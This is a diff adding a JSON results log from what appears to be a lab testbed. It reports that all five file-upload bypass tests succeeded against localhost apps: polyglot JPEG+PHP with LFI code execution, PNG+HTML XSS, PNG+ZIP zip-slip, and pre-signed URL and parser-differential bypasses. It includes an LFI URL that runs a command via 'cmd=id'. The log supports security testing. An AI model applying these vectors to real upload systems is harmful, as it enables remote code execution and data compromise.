@@ -1,0 +1,63 @@
+{
+  "tool": "PolyMorph Testbed Harness",
+  "timestamp": "2026-11-18T09:51:44.189871+00:00",
+  "disclaimer": "CONTROLLED LAB ENVIRONMENT \u2014 Academic research only. Not for use against real systems.",
+  "results": [
+    {
+      "tier": 1,
+      "name": "Tier 1 \u2014 Legacy PHP (LAMP)",
+      "vector": "JPEG+PHP \u2192 LFI (RCE)",
+      "upload_status": 200,
+      "upload_bypassed": true,
+      "lfi_triggered": true,
+      "lfi_url": "http://localhost:8081/?page=uploads/avatar.jpg&cmd=id",
+      "status": "BYPASS",
+      "note": "Upload filter bypassed (LFI RCE confirmed). URL: http://localhost:8081/?page=uploads/avatar.jpg&cmd=id"
+    },
+    {
+      "tier": 2,
+      "name": "Tier 2 \u2014 Modern MERN (Node.js + Express)",
+      "vector": "PNG+HTML \u2192 MIME Sniffing XSS",
+      "upload_status": 200,
+      "upload_bypassed": true,
+      "xss_url": "http://localhost:3001/uploads/avatar_1794995501593.png",
+      "status": "BYPASS",
+      "note": "file-type magic check passed. Open XSS URL directly to trigger script execution."
+    },
+    {
+      "tier": 2,
+      "name": "Tier 2 \u2014 Modern MERN (Node.js + Express)",
+      "vector": "PNG+ZIP \u2192 Parser Differential (Zip-Slip)",
+      "upload_status": 200,
+      "upload_bypassed": true,
+      "status": "BYPASS",
+      "note": "file-type sees PNG, archiveWorker sees ZIP. Check backend/extracted/ after upload."
+    },
+    {
+      "tier": 3,
+      "name": "Tier 3 \u2014 Cloud-Native (MinIO + FastAPI)",
+      "vector": "Pre-signed URL Bypass",
+      "presign_status": 200,
+      "upload_status": 200,
+      "upload_bypassed": true,
+      "status": "BYPASS",
+      "note": "File uploaded directly to MinIO bucket, bypassing all FastAPI validation middleware."
+    },
+    {
+      "tier": 3,
+      "name": "Tier 3 \u2014 Cloud-Native (MinIO + FastAPI)",
+      "vector": "Parser Differential (python-magic vs zipfile)",
+      "magic_mime": "image/png",
+      "zip_detected": true,
+      "differential_gap": "File passes image validation but also contains ZIP payload!",
+      "status": "BYPASS"
+    }
+  ],
+  "summary": {
+    "total": 5,
+    "bypassed": 5,
+    "blocked": 0,
+    "skipped": 0,
+    "errors": 0
+  }
+}
